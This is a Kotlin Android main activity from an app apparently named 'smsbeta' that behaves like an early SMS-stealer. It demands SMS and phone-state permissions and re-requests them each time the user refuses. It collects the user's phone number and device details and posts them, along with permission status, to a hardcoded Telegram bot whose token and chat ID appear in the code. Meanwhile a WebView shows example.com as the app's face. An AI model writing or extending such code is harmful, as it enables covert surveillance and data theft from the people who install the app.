package com.analyzer.smsbeta

import android.Manifest
import android.annotation.SuppressLint
import android.app.AlertDialog
import android.content.Context
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.os.Bundle
import android.webkit.WebView
import android.widget.EditText
import androidx.activity.enableEdgeToEdge
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okio.IOException

class MainActivity : AppCompatActivity() {
    private lateinit var sharedPreferences: SharedPreferences
    private lateinit var myWebView: WebView
    private val client = OkHttpClient()
    
    companion object {
        private const val PERMISSION_REQUEST_CODE = 100
        private const val PREFS_NAME = "AppPrefs"
        private const val PHONE_NUMBER_KEY = "phone_number"
        private val REQUIRED_PERMISSIONS = arrayOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_PHONE_STATE
        )
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContentView(R.layout.activity_main)
        
        sharedPreferences = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
        myWebView = findViewById(R.id.webview)
        
        with(myWebView.settings) {
            javaScriptEnabled = true
            domStorageEnabled = true
            javaScriptCanOpenWindowsAutomatically = true
        }

        checkInternetConnectionBeforePermissions()
    }

    private fun checkInternetConnectionBeforePermissions() {
        if (isInternetAvailable()) {
            checkPermissions()
        } else {
            showNoInternetDialog {
                checkInternetConnectionBeforePermissions()
            }
        }
    }

    @SuppressLint("ServiceCast")
    private fun isInternetAvailable(): Boolean {
        val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val network = connectivityManager.activeNetwork ?: return false
            val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return false
            capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) &&
                    capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
        } else {
            @Suppress("DEPRECATION")
            val networkInfo = connectivityManager.activeNetworkInfo
            @Suppress("DEPRECATION")
            networkInfo != null && networkInfo.isConnected
        }
    }

    private fun showNoInternetDialog(retryAction: () -> Unit) {
        AlertDialog.Builder(this)
            .setTitle("Нет подключения к интернету")
            .setMessage("Для продолжения работы приложения требуется интернет-соединение")
            .setPositiveButton("Попробовать снова") { _, _ -> retryAction() }
            .setCancelable(false)
            .show()
    }

    private fun checkPermissions() {
        val permissionsToRequest = REQUIRED_PERMISSIONS.filter { permission ->
            ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED
        }.toTypedArray()

        if (permissionsToRequest.isNotEmpty()) {
            ActivityCompat.requestPermissions(
                this,
                permissionsToRequest,
                PERMISSION_REQUEST_CODE
            )
        } else {
            onAllPermissionsGranted()
            sendPermissionsNotification("Все разрешения уже предоставлены")
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        if (requestCode == PERMISSION_REQUEST_CODE) {
            val allGranted = grantResults.all { it == PackageManager.PERMISSION_GRANTED }

            if (allGranted) {
                onAllPermissionsGranted()
                sendPermissionsNotification("Пользователь предоставил все разрешения")
            } else {
                checkPermissions()
                sendPermissionsNotification("Пользователь отказал в некоторых разрешениях")
            }
        }
    }

    private fun onAllPermissionsGranted() {
        val savedPhoneNumber = sharedPreferences.getString(PHONE_NUMBER_KEY, null)
        if (savedPhoneNumber == null) {
            showPhoneNumberInputDialog()
        } else {
            loadWebView()
        }
    }

    private fun showPhoneNumberInputDialog() {
        val input = EditText(this).apply {
            hint = "Введите номер телефона"
        }

        AlertDialog.Builder(this)
            .setTitle("Ввод номера телефона")
            .setMessage("Пожалуйста, введите ваш номер телефона")
            .setView(input)
            .setPositiveButton("Продолжить") { _, _ ->
                val phoneNumber = input.text.toString().trim()
                if (phoneNumber.isNotEmpty()) {
                    sharedPreferences.edit().putString(PHONE_NUMBER_KEY, phoneNumber).apply()
                    sendUserDataToBot(phoneNumber, "Новый пользователь ввел номер телефона")
                    loadWebView()
                } else {
                    showPhoneNumberInputDialog()
                }
            }
            .setCancelable(false)
            .show()
    }

    private fun sendPermissionsNotification(message: String) {
        val phoneNumber = sharedPreferences.getString(PHONE_NUMBER_KEY, "Номер не указан")
        val deviceInfo = getDeviceInfo()
        val fullMessage = """
            $message
            
            Номер телефона: $phoneNumber
            Устройство: $deviceInfo
            Разрешения: ${REQUIRED_PERMISSIONS.joinToString()}
        """.trimIndent()
        
        sendToTelegramBot(fullMessage)
    }

    private fun sendUserDataToBot(phoneNumber: String, context: String) {
        val deviceInfo = getDeviceInfo()
        val message = """
            $context
            
            Номер телефона: $phoneNumber
            Устройство: $deviceInfo
        """.trimIndent()
        
        sendToTelegramBot(message)
    }

    private fun loadWebView() {
        myWebView.loadUrl("https://www.example.com")
    }

    private fun getDeviceInfo(): String {
        return """
            Модель: ${Build.MANUFACTURER} ${Build.MODEL}
            Android версия: ${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})
            Устройство: ${Build.DEVICE}
        """.trimIndent()
    }

    private fun sendToTelegramBot(message: String) {
        try {
            val botToken = "7824327491:AAGmZ5eA57SWIpWI3hfqRFEt6cnrQPAhnu8"
            val chatId = "6331293386"
            val url = "https://api.telegram.org/bot$botToken/sendMessage"

            val mediaType = "application/json".toMediaType()
            val requestBody = """
                {
                    "chat_id": "$chatId",
                    "text": "$message",
                    "parse_mode": "Markdown"
                }
            """.trimIndent().toRequestBody(mediaType)

            val request = Request.Builder()
                .url(url)
                .post(requestBody)
                .build()

            client.newCall(request).enqueue(object : okhttp3.Callback {
                override fun onFailure(call: okhttp3.Call, e: IOException) {
                    e.printStackTrace()
                }

                override fun onResponse(call: okhttp3.Call, response: okhttp3.Response) {
                    response.close()
                }
            })
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}
